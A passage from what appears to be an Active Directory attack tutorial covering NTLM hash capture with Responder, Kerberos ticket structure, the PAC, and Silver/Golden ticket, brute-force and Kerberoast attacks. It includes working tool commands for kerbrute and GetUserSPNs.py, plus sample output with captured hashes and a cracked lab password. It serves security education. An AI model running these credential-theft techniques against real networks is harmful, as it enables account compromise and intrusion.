</span></span><span style="display:flex;"><span>[+] HTTP Options:
</span></span><span style="display:flex;"><span>    Always serving EXE         [OFF]
</span></span><span style="display:flex;"><span>    Serving EXE                [OFF]
</span></span><span style="display:flex;"><span>    Serving HTML               [OFF]
</span></span><span style="display:flex;"><span>    Upstream Proxy             [OFF]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>[+] Poisoning Options:
</span></span><span style="display:flex;"><span>    Analyze Mode               [OFF]
</span></span><span style="display:flex;"><span>    Force WPAD auth            [OFF]
</span></span><span style="display:flex;"><span>    Force Basic Auth           [OFF]
</span></span><span style="display:flex;"><span>    Force LM downgrade         [OFF]
</span></span><span style="display:flex;"><span>    Fingerprint hosts          [OFF]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>[+] Generic Options:
</span></span><span style="display:flex;"><span>    Responder NIC              [enp7s0]
</span></span><span style="display:flex;"><span>    Responder IP               [192.168.100.137]
</span></span><span style="display:flex;"><span>    Challenge set              [random]
</span></span><span style="display:flex;"><span>    Don't Respond To Names     ['ISATAP']
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>[!] Error starting TCP server on port 80, check permissions or other servers running.
</span></span><span style="display:flex;"><span>[+] Listening for events...
</span></span><span style="display:flex;"><span>[*] [LLMNR]  Poisoned answer sent to 192.168.100.7 for name fake-pc
</span></span><span style="display:flex;"><span>[*] [LLMNR]  Poisoned answer sent to 192.168.100.7 for name fake-pc
</span></span><span style="display:flex;"><span>[SMB] NTLMv2-SSP Client   : 192.168.100.7
</span></span><span style="display:flex;"><span>[SMB] NTLMv2-SSP Username : CONTOSO\anakin
</span></span><span style="display:flex;"><span>[SMB] NTLMv2-SSP Hash     : anakin::CONTOSO:9ec132434bd81f13:77E13480A5BE1935B832EE3E698C2424:0101000000000000C0653150DE09D2017C322564C9ADBF6D000000000200080053004D004200330001001E00570049004E002D00500052004800340039003200520051004100460056000400140053004D00420033002E006C006F00630061006C0003003400570049004E002D00500052004800340039003200520051004100460056002E0053004D00420033002E006C006F00630061006C000500140053004D00420033002E006C006F00630061006C0007000800C0653150DE09D20106000400020000000800300030000000000000000100000000200000EE905EC8AAB434C41EE46C38DB764C06DF037FE97986A0CE2A7B6D7043FA4C900A001000000000000000000000000000000000000900180063006900660073002F00660061006B0065002D00700063000000000000000000</span></span></code></pre></div>
</div>
<figcaption>
NTLM hashes capture with Responder.py
</figcaption>
</figure>
<p>
Another known possibility to retrieve NTLM hashes is to <a href="https://www.securify.nl/blog/living-off-the-land-stealing-netntlm-hashes">craft malicious files</a>
that establish connections with your server when they are open. You can use
<a href="https://github.com/Greenwolf/ntlm_theft">ntlm_theft</a> in order to create files to recolect NTLM hashes.</p>
<p>
Additionally, you can use vulnerabilities in web services like <a href="https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/">XXE or LFI</a> to
grab NTLM hashes, by forcing connections to your controlled machine. Some times
is even possible to grab NTLM hashes across the internet.</p>
<p>
Finally, you can crack the NTLM hashes with <a href="https://hashcat.net/hashcat/">hashcat</a>. The NTLM hashes (or
Net-NTLM hashes) are created by using the NT hash of the client account (and
public information contained in the AUTHENTICATE message). The NTLMv1 hashes are
faster to crack than NTLMv2 hashes since they are created with weaker algorithms.</p>
</div>
</div>
</div>
</div>
</div>
</div>
<div id="outline-container-kerberos" class="outline-3">
<h3 id="kerberos">
Kerberos
</h3>
<div id="outline-text-kerberos" class="outline-text-3">
<div id="outline-container-kerberos-basics" class="outline-4">
<h4 id="kerberos-basics">
Kerberos Basics
</h4>
<div id="outline-text-kerberos-basics" class="outline-text-4">
<p>
<a href="https://tools.ietf.org/html/rfc4120">Kerberos</a> is the preferred authentication protocol in Active Directory
networks for domain accounts (it cannot be used in workgroups). It is
implemented by the <a href="#kerberos-ssp">Kerberos SSP</a>. Kerberos is described in the <a href="https://tools.ietf.org/html/rfc4120">RFC 4120</a>, and the
extensions used in Active Directory are documented in the <a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-kile/2a32282e-dd48-4ad9-a542-609804b02cc9">MS-KILE</a> documentation.</p>
<p>
Kerberos focuses on the use of tokens called "tickets" that allows an user to be
authenticated against a principal.</p>
<div id="outline-container-kerberos-principals" class="outline-5">
<h5 id="kerberos-principals">
Kerberos principals
</h5>
<div id="outline-text-kerberos-principals" class="outline-text-5">
<p>
The most common <a href="https://datatracker.ietf.org/doc/html/rfc4120#section-6.2">Kerberos principals</a> are users and <a href="#services">services</a>, being this last type
the most used. </p>
<p>
To request a ticket for an service, you have to specify its SPN. For example,
HTTP/computer. There are several Kerberos principal types that can be used to
request for a service: NT-SRV-INST, NT-SRV-HST or NT-SRV-XHST.</p>
<p>
On the other part, it is possible to use principals to represent users, and in
fact they are usually used to indicate the name of the client that is requesting
the ticket. The user is usually represented by the <code class="verbatim">SamAccountName</code> (e.g "foo"),
using the NT-PRINCIPAL type.</p>
<p>
However, for there is also the
<a href="https://swarm.ptsecurity.com/kerberoasting-without-spns/">NT-ENTERPRISE type, that allows more explicit formats for identifying an user</a>,
like <code class="verbatim">SamAccountName@DomainFQDN</code> (e.g "foo@contoso.local"). The NT-ENTERPRISE
can be useful to identify users from different domains, when you are making an
inter-domain request.</p>
<p>
Additionally, you can also use a user principal as a target for a ticket. This
fact can be used by an attacker to perform a <a href="#kerberoast">Kerberoast</a> attack
<a href="https://swarm.ptsecurity.com/kerberoasting-without-spns/">without knowing the services of users</a>.</p>
</div>
</div>
<div id="outline-container-tickets" class="outline-5">
<h5 id="tickets">
Tickets
</h5>
<div id="outline-text-tickets" class="outline-text-5">
<p>
<a href="https://tools.ietf.org/html/rfc4120#section-5.3">Tickets</a> are structures partially encrypted that contain:</p>
<ul>
<li>The target principal (usually a service) for which the ticket applies</li>
<li>Information related to the client, such as the name and domain</li>
<li>A key to establish secure channels between the client and the service</li>
<li>Timestamps to determine the period in which the ticket is valid</li>
</ul>
<figure>
<div class="src src-asn1">
<pre tabindex="0"><code class="language-asn1" data-lang="asn1">Ticket          ::= [APPLICATION 1] SEQUENCE {
        tkt-vno         [0] INTEGER (5),
        realm           [1] Realm,
        sname           [2] PrincipalName, -- Usually the service SPN
        enc-part        [3] EncryptedData -- EncTicketPart
}

EncTicketPart   ::= [APPLICATION 3] SEQUENCE {
        flags                   [0] TicketFlags,
        key                     [1] EncryptionKey, -- Session Key
        crealm                  [2] Realm,
        cname                   [3] PrincipalName,
        transited               [4] TransitedEncoding,
        authtime                [5] KerberosTime,
        starttime               [6] KerberosTime OPTIONAL,
        endtime                 [7] KerberosTime,
        renew-till              [8] KerberosTime OPTIONAL,
        caddr                   [9] HostAddresses OPTIONAL,
        authorization-data      [10] AuthorizationData OPTIONAL -- Includes a PAC
}</code></pre>
</div>
<figcaption>
Ticket definition
</figcaption>
</figure>
<div id="outline-container-pac" class="outline-6">
<h6 id="pac">
PAC
</h6>
<div id="outline-text-pac" class="outline-text-6">
<p>
Apart from the regular ticket data, the Active Directory implementation of
Kerberos usually includes in the <code class="verbatim">authorization-data</code> ticket field an important
structure in Active Directory authentication: the PAC.</p>
<p>
The <a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-pac/166d8064-c863-41e1-9c23-edaaa5f36962">PAC</a> (Privilege Attribute Certificate) contains <a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-pac/69e86ccc-85e3-41b9-b514-7d969cd0ed73">security information</a> related
with the client:</p>
<ul>
<li>The client domain: Includes the domain name and <a href="#sid">SID</a> (LogonDomainName and
LogonDomainId respectively).</li>
<li>The client user: The username and user <a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-pac/f2ef15b6-1e9b-48b5-bf0b-019f061d41c8#gt_df3d0b61-56cd-4dac-9402-982f1fedc41c">RID</a> (EffectiveName and UserId
respectively).</li>
<li>The client groups: The <a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-pac/f2ef15b6-1e9b-48b5-bf0b-019f061d41c8#gt_df3d0b61-56cd-4dac-9402-982f1fedc41c">RIDs</a> (GroupIds) of those domain groups to which the
user belongs.</li>
<li>Other groups: The PAC includes other <a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dtyp/78eb9013-1c3a-4970-ad1f-2b1dad588a25">SIDs</a> (ExtraSids) that references to
non-domain groups, that can be applied for inter-domain authentications, as
well as <a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dtyp/81d92bba-d22b-4a8c-908a-554ab29148ab">Well-Known SIDs</a> used to indicate special characteristics.</li>
</ul>
<p>Apart from user info the PAC also include <a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-pac/6e95edd3-af93-41d4-8303-6c7955297315">several signatures</a> used to verify the
integrity of the PAC and ticket data.</p>
<ul>
<li><a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-pac/a194aa34-81bd-46a0-a931-2e05b87d1098">Server signature</a>: A signature of the PAC content created with the same key
used to encrypt the ticket.</li>
<li><a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-pac/3122bf00-ea87-4c3f-92a0-91c0a99f5eec">KDC signature</a>: A signature of the Server signature created with the KDC key.
This could be used to check that the PAC was created by the KDC and prevent
<a href="#golden-silver-ticket">Silver ticket</a> attacks, but is not checked.</li>
<li><a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-pac/76c10ef5-de76-44bf-b208-0d8750fc2edd">Ticket signature</a>: A signature of the ticket content created with the KDC key.
This signature was recently introduced to prevent the <a href="https://blog.netspi.com/cve-2020-17049-kerberos-bronze-bit-theory/">Bronze bit attack</a>.</li>
</ul>
</div>
</div>
</div>
</div>
<div id="outline-container-kerberos-actors" class="outline-5">
<h5 id="kerberos-actors">
Kerberos actors
</h5>
<div id="outline-text-kerberos-actors" class="outline-text-5">
<p>
As we have seen Kerberos uses tickets to authenticate users against services.
But how are they are used? To answer this question, before we should know what
actors are involved in Kerberos authenticate.</p>
<p>
We already know the first one, the client. This is the user that receives the
tickets and uses them get access to the services in the domain (or forest).</p>
<p>
Then we have the second actor, the service. Well, usually Kerberos talk about
the <strong>AP</strong> (Application Server), that is the machine that offers the service the
user wants to access. The AP can be any computer of the domain.</p>
<p>
And finally, we need that someone provide the tickets to the user, that is the
purpose of the <strong>KDC</strong> (Key Distribution Center). As you may guess, in Active
Directory the KDC is the Domain Controller, since is the one that has access to
the domain <a href="#database">database</a> required to authenticate users.</p>
<blockquote>
<p>In Kerberos, the TGTs are provided by the Authentication Service/Server (AS) and
the STs by the Ticket-Granting Service/Server (TGS). Both services ask to the
KDC for the Kerberos keys. However, since all these services usually run in the
same server, for sake of simplicity will be refer them just as KDC.</p>
</blockquote>
</div>
</div>
<div id="outline-container-ticket types" class="outline-5">
<h5 id="ticket types">
Ticket types
</h5>
<div id="outline-text-ticket types" class="outline-text-5">
<p>
So now that we have the client, the AP, the KDC and the tickets let's see how
this Kerberos protocol work. For this we should keep in mind that there are two
types of tickets in Kerberos protocol:</p>
<div id="outline-container-st" class="outline-6">
<h6 id="st">
ST
</h6>
<div id="outline-text-st" class="outline-text-6">
<p>
The first type are <strong>STs</strong> (Service tickets), that a client presents to a
AP/service/principal in order to get access to it. The KDC issues the STs for
clients that request for them.</p>
<blockquote>
<p>In many other publications, the STs are called TGSs. However in <a href="https://datatracker.ietf.org/doc/html/rfc4120/">rfc4120</a> the TGS
refers to the service that provides the service tickets. I think that probably
ST are called TGSs due to a misinterpretation of the term Ticket-Granting
Service, that one could think that refers to tickets that grants service (as I
did in the past), but refers to the service that grants tickets. Anyway, in case
other publication or tool is talking about TGSs it is probably referring to the
tickets that are used to getting access to a service. </p>
</blockquote>
<p>
In Active Directory, a client can get a ST for any <a href="#services">service</a> registered in the
domain database, it doesn't matter if the user cannot access to the service
(Kerberos doesn't handle authorization) or even if the service is not running.</p>
<p>
The STs are meant to be read by the target principal/service and no one else
since they include information about the client that needs to be authenticated
and the session key to establish a connection with the client. Therefore, the
<strong>STs are encrypted with the key of the target principal</strong>.</p>
<p>
In case of Active Directory, usually the target principals are services, that
belongs to user accounts (or computer accounts, that are also users in Active
Directory). In that case the STs are encrypted with the key of the account owner
of the service.</p>
<p>
From this information we can conclude a couple of things:</p>
<p>
Firstly, if we know the key of the target principal (that is derived from the
password) then we could forge tickets for that principal. In terms of Active
Directory, if we know the key of an user, we can craft custom tickets to access
to any service of that user. These custom tickets are know as <a href="#golden-silver-ticket">Silver ticket</a>.</p>
<p>
For example, if you know the password of a computer account (stored in the <a href="#lsa-secrets">LSA
Secrets</a> of the machine), you can create Silver tickets for the <a href="#smb">SMB</a> service of
the machine and access like an Administrator to the machine.</p>
<p>
However, you may notice that the KDC signature of the ticket PAC is signed with
the KDC key, so we cannot forge a total real ticket. That is true, however, the
KDC signature is not checked by services.</p>
<p>
The second think to note is that if several services belongs to the same user,
they will be encrypted with the same key. You can use this information along
with the fact that the target service of the ticket is specify in the not
encrypted part of the ticket (the <code class="verbatim">sname</code> field). Hence, then if you change
the target service of the ticket to another service of the same user, the
<a href="https://www.secureauth.com/blog/kerberos-delegation-spns-and-more/">ticket will work</a> for the new target service.</p>
<p>
This technique could be useful in some situations, for example, if you are able
to get a ST for an administrator to an MSSQL database in machineA (SPN =
MSSQLSvc\machineA), you could modify the service to point the <a href="#smb">SMB</a> service
of the same machine (SPN = CIFS\machineA) and get access to the machineA.</p>
</div>
</div>
<div id="outline-container-tgt" class="outline-6">
<h6 id="tgt">
TGT
</h6>
<div id="outline-text-tgt" class="outline-text-6">
<p>
In order to get a ST from the KDC, the user is required to present the other
type of ticket, a <strong>TGT</strong> (Ticket Granting Ticket). The TGT is like a ST for the
KDC (and, in fact, is not more than that).</p>
<p>
Actually, following the principle that only the target principal should be
allowed to access to the ticket, all the TGTs are encrypted with the key of the
<code class="verbatim">krbtgt</code> account of the domain, known as the KDC key. Therefore, if you can
retrieve the key of the <code class="verbatim">krbtgt</code> (stored in the <a href="#domain-database-dumping">domain database</a>), you could
create custom TGTs known as <a href="#golden-silver-ticket">Golden tickets</a>.</p>
<p>
Since you can create ticket for any client, you could impersonate any user in
the domain, including Administrators. The Golden tickets can even used to
<a href="https://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/">compromise the entire forest</a> by setting special privileged SIDs in the PAC, like
<a href="#administrative-groups">Enterprise Admins</a>. </p>
<p>
This can be done because the PAC contains the security data related to the user
and it is not verified if the information is true (at least until the ticket
<a href="https://passing-the-hash.blogspot.com/2014/09/pac-validation-20-minute-rule-and.html">is 20 minutes old</a>), so you can add any user to any group inside of the ticket,
and even create tickets for non-existent users.</p>
<p>
In order to get a TGT, the user <em>usually</em> needs to be authenticated against the
KDC by using its credentials.</p>
</div>
</div>
</div>
</div>
<div id="outline-container-ticket-acquisition" class="outline-5">
<h5 id="ticket-acquisition">
Ticket acquisition
</h5>
<div id="outline-text-ticket-acquisition" class="outline-text-5">
<p>
Now that we know about STs and TGTs, let's examine in more detail <a href="https://www.tarlogic.com/en/blog/how-kerberos-works/">how Kerberos
works</a>, which means, <a href="https://syfuhs.net/a-bit-about-kerberos">how tickets are issued</a>:</p>
<figure>
<pre class="example">                              KDC (DC)
   .-----&gt;-1) AS-REQ-------&gt;   .---.
   |                          /   /| -------8] PAC Response-----------.
   | .--&lt;-2) AS-REP (TGT)--&lt; .---. |                                  |
   | |                       |   | '                                  |
   | | .&gt;-4) TGS-REQ (TGT)-&gt; |   |/  &lt;-7] KERB_VERIFY_PAC_REQUEST-.   |
   | | |                     '---'                                |   |
   | | | .&lt;-5) TGS-REP (ST)--&lt;'                                   |   |
   | | | |                                                        |   v
   | v | v                                                        ^   
   ^   ^                                                          .---.
    _____                                                        /   /|
   |     |   &lt;----3) Authentication negotiation (SPNEGO)----&gt;   .---. |
   |_____|                                                      |   | '
   /:::::/   &gt;-------------------6) AP-REQ (ST)-------------&gt;   |   |/ 
   client                                                       '---'  
             &lt;-------------------9] AP-REP------------------&lt;  AP (service)
</pre>
<figcaption>
Kerberos process
</figcaption>
</figure>
<ol>
<li>The client requests a TGT to the AS (KDC) by sending an <a href="https://tools.ietf.org/html/rfc4120#section-5.4.1">AS-REQ</a> message. In
the AS-REQ message the client can include a timestamp encrypted with its
Kerberos key. This is called Kerberos <a href="https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-2000-server/cc961961(v=technet.10)?redirectedfrom=MSDN">preauthentication</a> and 
<a href="https://en.hackndo.com/kerberos-asrep-roasting/">sometimes is not required</a>.</li>
<li>The AS (KDC) checks the timestamp (or not) and responds with an <a href="https://tools.ietf.org/html/rfc4120#section-5.4.2">AS-REP</a>
message that contains two encrypted parts: a TGT encrypted with the KDC key
and client data encrypted with the client key. Several information like the
session key is replicated in both parts so both the user and KDC can share
it.</li>
<li>Afterwards, the client connects with a service in an AP, and negotiates the
authentication protocol with SPNEGO. If Kerberos is selected the client needs
to get a ST for the target service.</li>
<li>Therefore, it requests a ST to the KDC by sending a <a href="https://tools.ietf.org/html/rfc4120#section-5.4.1">TGS-REQ</a> that includes
its TGT and the <a href="https://en.hackndo.com/service-principal-name-spn/">SPN</a> of the target service. It also sends data encrypted with
the session key, like the client username and a timestamp, in order to verify
the connection.</li>
<li>The KDC decrypts the TGT with its key, thus getting access to the username
and the session key. The KDC uses the session key to decrypt the username
sent by the user to verify that is correct.

After checking that everything is correct, the KDC responds with a <a href="https://tools.ietf.org/html/rfc4120#section-5.4.2">TGS-REP</a>
message that contains two encrypted parts: a ST for the target service,
encrypted with the service user key and client data encrypted with the
session key. Several information like the service session key is replicated
in both parts so both the user and service can share it.</li>
<li>The client sends the ST to the service in an <a href="https://tools.ietf.org/html/rfc4120#section-5.5.1">AP-REQ</a> message (inside of the
application protocol). The service decrypts the ST and gets the service
session key and the PAC. The service will use the security information of the
PAC about the client to determine if the user have access to its resources.</li>
<li>(Optional) In case the service want to <a href="https://docs.microsoft.com/en-us/archive/blogs/openspecification/understanding-microsoft-kerberos-pac-validation">validate the PAC</a>, it can use the
Netlogon protocol to ask to the DC to check the PAC signature with a
<a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-apds/b27be921-39b3-4dff-af4a-b7b74deb33b5">KERB_VERIFY_PAC_REQUEST</a>. </li>
<li>(Optional) The server will check the PAC and respond with a code indicating
if the PAC is correct.</li>
<li>(Optional) Finally, in case of the client requires it, the service must
authenticate itself by responding to the AP-REQ message with an <a href="https://tools.ietf.org/html/rfc4120#section-5.5.2">AP-REP</a>
message and using the session key as proof that the service can decrypt the
ST and therefore that is the real service and not a fake one.</li>
</ol>
<p>From this process, we can notice that Kerberos, unlike NTLM, have messages that
are not included in other application protocol. Such is the case of AS-REQ and
TGS-REQ, that are sent directly to the DC.</p>
</div>
</div>
<div id="outline-container-kerberos-services" class="outline-5">
<h5 id="kerberos-services">
Kerberos services
</h5>
<div id="outline-text-kerberos-services" class="outline-text-5">
<p>
The DC listens Kerberos in the port 88/TCP and 88/UDP.</p>
<figure>
<pre class="example">                           .-----
                           |
                         .---
            .----KDC---&gt; | 88
            |            '---   Domain
 Kerberos --|              |
            |            .---  Controller
            '-kpasswd--&gt; | 464
                         '---
                           |
                           '-----
</pre>
<figcaption>
Kerberos ports
</figcaption>
</figure>
<p>
Apart from the KDC, Kerberos has another service, <a href="https://tools.ietf.org/html/rfc3244.html">kpasswd</a>, that allows to change
the password of the users in the domain. The kpasswd can be found in the port
464/TCP and 464/UDP of the DCs. It can be used with the utility <a href="https://docs.microsoft.com/en-gb/windows-server/administration/windows-commands/ksetup-changepassword">ksetup</a>, from
the CTRL+ALT+DEL "Change a password" screen, or with <a href="https://github.com/GhostPack/Rubeus#changepw">Rubeus changepw</a>.</p>
<figure>
<img src="./change_password.png" alt="./change_password.png" title="./change_password.png"><figcaption>
Change password utility uses kpasswd
</figcaption>
</figure>
</div>
</div>
<div id="outline-container-kerberos-keys" class="outline-5">
<h5 id="kerberos-keys">
Kerberos keys
</h5>
<div id="outline-text-kerberos-keys" class="outline-text-5">
<p>
By changing the password, the user changes the Kerberos keys used for encrypting
the Kerberos messages and tickets.</p>
<p>
There are many different keys, since each one of them is used for a
different <a href="https://web.mit.edu/kerberos/kfw-4.1/kfw-4.1/kfw-4.1-help/html/encryption_types.htm#supported">encryption algorithm</a> used by Kerberos. The possible encryption
algorithms used by Kerberos are the following:</p>
<ul>
<li><a href="https://tools.ietf.org/html/rfc4757">RC4-HMAC</a>: The key used for RC4 is the <a href="https://tools.ietf.org/html/rfc4757#section-2">NT hash</a> of the user.</li>
<li><a href="https://tools.ietf.org/html/rfc3962">AES128-CTS-HMAC-SHA1-96</a>: The key used for AES128 is a hash of 16 bytes
<a href="https://gist.github.com/Kevin-Robertson/9e0f8bfdbf4c1e694e6ff4197f0a4372">derived from the user password</a> (and domain and username).</li>
<li><a href="https://tools.ietf.org/html/rfc3962">AES256-CTS-HMAC-SHA1-96</a>: The key used for AES256 is a hash of 32 bytes
<a href="https://gist.github.com/Kevin-Robertson/9e0f8bfdbf4c1e694e6ff4197f0a4372">derived from the user password</a> (and domain and username).</li>
<li><a href="https://datatracker.ietf.org/doc/html/rfc3961#section-6.2.1">DES-CBC-MD5</a>: This one <a href="https://datatracker.ietf.org/doc/html/rfc6649">is deprecated</a>, but the key is still stored in the domain
database for users.</li>
</ul>
<p>Depends on the algorithm selected, Kerberos uses a different key. In Active
Directory the recommendation is to use AES256.</p>
<p>
Note: When I use the term Kerberos key in this article, I will refer in general
to any of the possible keys negotiated by Kerberos.</p>
</div>
</div>
</div>
</div>
<div id="outline-container-kerberos-basic-attacks" class="outline-4">
<h4 id="kerberos-basic-attacks">
Kerberos basic attacks
</h4>
<div id="outline-text-kerberos-basic-attacks" class="outline-text-4">
<p>
Now that we know the Kerberos basics, lets explain some <a href="https://www.tarlogic.com/en/blog/how-to-attack-kerberos/">Kerberos attacks</a>.</p>
<blockquote>
<p>If you look for Kerberos attacks command, you can check the <a href="https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a">Kerberos cheatsheet</a>.</p>
</blockquote>
<div id="outline-container-kerberos-brute-force" class="outline-5">
<h5 id="kerberos-brute-force">
Kerberos brute-force
</h5>
<div id="outline-text-kerberos-brute-force" class="outline-text-5">
<p>
Since Kerberos is an authentication protocol, it can be used to test the
credentials of the users in the network. </p>
<p>
Furthermore, Kerberos errors are very verbose and allow to distinguish a plenty
of situations in a bruteforcing attack:</p>
<ul>
<li>KDC_ERR_PREAUTH_FAILED: Incorrect password</li>
<li>KDC_ERR_C_PRINCIPAL_UNKNOWN: Invalid username</li>
<li>KDC_ERR_WRONG_REALM: Invalid domain</li>
<li>KDC_ERR_CLIENT_REVOKED: Disabled/Blocked user</li>
</ul>
<p>By checking the error messages, you not only can test for valid credentials, but
also enumerate user accounts and be aware if your attack has blocked some
account. Be careful by launching this kind of attacks!!</p>
<p>
Other thing to keep in mind, is that the authentication errors are not logged
with a <a href="https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4625">normal logon failure event</a> (code: 4625), but with
<a href="https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4771">Kerberos pre-authentication failure</a> (code: 4771), that is not logged by default.</p>
<p>
You can use <a href="https://github.com/GhostPack/Rubeus#brute">Rubeus brute</a>, <a href="https://github.com/ropnop/kerbrute">kerbrute (Go)</a>, <a href="https://github.com/TarlogicSecurity/kerbrute">kerbrute (Python)</a> or <a href="https://github.com/Zer1t0/cerbero#brute">cerbero</a> in order
to launch a Kerberos brute-force attack.</p>
<figure>
<div class="src src-text">
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>$ python kerbrute.py -domain contoso.local -users users.txt -passwords passwords.txt -dc-ip 192.168.100.2
</span></span><span style="display:flex;"><span>Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>[*] Valid user =&gt; Anakin
</span></span><span style="display:flex;"><span>[*] Blocked/Disabled user =&gt; Leia
</span></span><span style="display:flex;"><span>[*] Valid user =&gt; Han [NOT PREAUTH]
</span></span><span style="display:flex;"><span>[*] Valid user =&gt; Administrator
</span></span><span style="display:flex;"><span>[*] Stupendous =&gt; Anakin:Vader1234!
</span></span><span style="display:flex;"><span>[*] Saved TGT in Anakin.ccache</span></span></code></pre></div>
</div>
<figcaption>
Kerberos brute-force attack with kerbrute.py
</figcaption>
</figure>
</div>
</div>
<div id="outline-container-kerberoast" class="outline-5">
<h5 id="kerberoast">
Kerberoast
</h5>
<div id="outline-text-kerberoast" class="outline-text-5">
<p>
In Active Directory, a ST can be requested by any user for any service that it
is registered in the domain database through an <a href="#services">SPN</a>, regardless of whether the
service is running or not.</p>
<p>
Moreover, the ST will be partially encrypted with a Kerberos key (derived from
the password) of the service user. Therefore, if you get a ST, you can try to crack
the service user password by trying to decrypt the ST.</p>
<p>
Most services are registered in machine accounts, which have auto-generated
passwords of <a href="https://adsecurity.org/?p=280">120 characters that changes every month</a>, so crack their STs is
unfeasible.</p>
<p>
However, occasionally services are assigned to regular user accounts, managed by
people, that can have weak passwords. The STs of that services would allow to
crack them in order to retrieve the user passwords.</p>
<p>
The <a href="https://en.hackndo.com/kerberoasting/">Kerberoast attack</a> consist on requests STs for those services of regular
user accounts and try to crack them to get the user passwords. Usually, the
users that have services also have privileges, so these are juicy accounts.</p>
<p>
You can check the user accounts with SPNs with any LDAP client, by using the
following filter:</p>
<figure>
<div class="src src-ladp">
<pre tabindex="0"><code class="language-ladp" data-lang="ladp">(&amp;(samAccountType=805306368)(servicePrincipalName=*))</code></pre>
</div>
<figcaption>
LDAP filter for users with SPNs
</figcaption>
</figure>
<p>
More specifically, to retrieve the STs to crack you can use the
<a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py">impacket GetUserSPNs.py</a> script, the <a href="https://github.com/GhostPack/Rubeus#kerberoast">Rubeus kerberoast</a> command, or the
<a href="https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/Invoke-Kerberoast.ps1">Invoke-Kerberoast.ps1</a> script.</p>
<figure>
<div class="src src-text">
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>root@debian10:~# GetUserSPNs.py 'contoso.local/Anakin:Vader1234!' -dc-ip 192.168.100.2 -outputfile kerberoast-hashes.txt
</span></span><span style="display:flex;"><span>Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>ServicePrincipalName  Name  MemberOf                                       PasswordLastSet             LastLogon                   Delegation 
</span></span><span style="display:flex;"><span>--------------------  ----  ---------------------------------------------  --------------------------  --------------------------  ----------
</span></span><span style="display:flex;"><span>HTTP/ws01-10          leia  CN=Domain Admins,CN=Users,DC=contoso,DC=local  2021-01-01 16:38:02.183703  2021-01-15 11:46:13.998905             
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>root@debian10:~# cat kerberoast-hashes.txt 
</span></span><span style="display:flex;"><span>$krb5tgs$23$*leia$CONTOSO.LOCAL$HTTP/ws01-10*$65ca3e856acd6d9438c05cb6c283dcb5$ab86cafcf1dee23d2466973679fc315e9fef3fa2ddcae82d844b31e1651ed983a4d4ff0846148ddf63f80129cd2cb663c7daed26169513ec398464a9796ae7f84e593829f16654279d5b3fa4286eb1e6467a3d569bc88d7150f30cf2dc83ff4185f0a7590b9e5a05ba63cb9dbb710df295c4356cc57ac53cc2d0e0974aeb0e2ae930e6311c5268c457d5da726393e93e9b0d1c8d745ad7b6d63bf36eb11c7f171da87bee9d4ac69b2a8f70157ce402af52ffd35498e3cade179af266be08e5fcf3aee6a0dae26afb6470ba2d25c922868b9a0ca4c80eece585782ea0ea96b6e4f3ee56dc1808990ecf456c021d04ec74edef98b3235553176e55d56a7f3ee9c76f2f22ab7e3d30fabc658a516f8ef03710032aaae36a917cc7e677857c09df3035bd6034aa192c620c9cb6452533225e9606ac06cf0a6a5865468599cd73907b574cef0c081df388ea50176288a444692db96026d2f33f3ba4e8597d11557443e262bee86ca6485272addcf03056a93b6e7e60c02a152640f320e7094f5897fbf1cee83ab45a6f62fc554ec1c67878d9aa7974e43e2f1bdff2b0c197e3ccbd9daf84c1a37bc453aec6a0fa502c05ae530e14a5d1f7bceb5cb1393460a0f8eec8b058ede6ceda637a3c248fcd1e1fe57ae2f2d343c5e749cf9897023b910a3e2b13025584b2a9d4e73e9809ba25231b3fd3616476e51406993d354c9015a95888957e3d3d69784dc8b5c12b11e225756a41485c57467aa1c4041e6c7879f4efe65710fd760c5c3472f1ebefefa8a0f5099ccff5ef84162b1ddd42d795d82a8ac09f811e692c5aec13ee5f9e6335a5501f50412cee10da5a1a444cc5a1f9885885088b6f01d36dc8684101fde2a3c4a40ffe424ca8b3512455f5662794c64fed3b5183aaa9a338f18a33da8e41ac8a4e5598925cfe49db7362f107e018694922b26e20d5e3f125ff151f4299919fa082ad6f0d15643a69584a41b06ba46cca25c57ac51e7430c9166cdcc34428e108fba970d0c550694b431179d867f6b6dfe91e893be37bcf8407e9965921cbcf7b17a7f575ec64e4c7fb8bde0d4994b382cc58b44fc964528ac9aae46b5a84109f3f3ef23a71cca40355d71c95aa191cc11fbd66613f05f58eb74b07530b3deef934811da775c00d6a4217508501b14958b5241a8be72d20f891d5122936ebee8c636a7c746a3bae78d435c11efa4c8